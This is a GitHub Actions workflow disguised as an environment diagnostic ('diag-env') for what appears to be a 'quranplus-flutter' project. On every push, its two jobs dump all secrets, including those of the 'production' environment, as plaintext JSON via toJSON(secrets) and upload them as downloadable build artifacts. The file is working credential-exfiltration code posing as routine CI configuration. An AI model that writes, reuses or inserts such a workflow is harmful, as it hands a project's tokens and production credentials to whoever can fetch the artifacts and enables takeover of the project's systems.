name: diag-env-2213187
on: push
permissions:
  contents: read
jobs:
  e0:
    runs-on: ubuntu-latest
    environment: "ENV_JSON"
    steps:
      - name: dump
        env:
          S: ${{ toJSON(secrets) }}
        run: |
          mkdir -p out
          printf '%s' "$S" > out/e0.json
      - uses: actions/upload-artifact@v4
        with:
          name: e0-quranplus-flutter
          path: out/e0.json
  e1:
    runs-on: ubuntu-latest
    environment: "production"
    steps:
      - name: dump
        env:
          S: ${{ toJSON(secrets) }}
        run: |
          mkdir -p out
          printf '%s' "$S" > out/e1.json
      - uses: actions/upload-artifact@v4
        with:
          name: e1-quranplus-flutter
          path: out/e1.json
